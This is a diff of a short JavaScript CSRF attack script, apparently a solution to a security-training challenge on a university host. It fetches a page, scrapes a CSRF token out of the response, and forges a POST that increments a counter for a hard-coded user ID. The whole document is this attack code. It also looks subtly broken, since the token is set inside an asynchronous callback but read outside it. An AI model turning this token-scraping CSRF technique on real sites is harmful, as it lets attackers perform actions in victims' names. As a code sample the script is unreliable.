@@ -1,25 +1,29 @@
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
 
 <script>
-  $.ajaxForm({
-    url : 'https://snickerboa.it.liu.se/user/csrfchallengefive/plusplus', // or whatever
-    data: {
+   model = {
       userId: "86109c9eed773b92480275854966986d3c4901a6",
       csrfToken: ""
-    },
+  };
+  
+  $.ajax({
+    url : 'https://snickerboa.it.liu.se/user/csrfchallengefive/plusplus', // or whatever
+    data: JSON.stringify(model),
+    dataType: "application/json",
     success : function (response) {
       var _token = response.split(" ")[11].split("<br>")[0];
     }
-  }).submit();
+  });
  
-  $.ajaxForm({
+  model = {
+    userId: "86109c9eed773b92480275854966986d3c4901a6",
+    csrfToken: _token
+  };
+  
+  $.ajax({
     type: "POST",
     url: "https://snickerboa.it.liu.se/user/csrfchallengefive/plusplus",
-    data: {
-        userId: "86109c9eed773b92480275854966986d3c4901a6",
-        csrfToken: _token
-    },
+    data: JSON.stringify(model),
     async: false
-  }).submit();
-  
+  });
 </script>
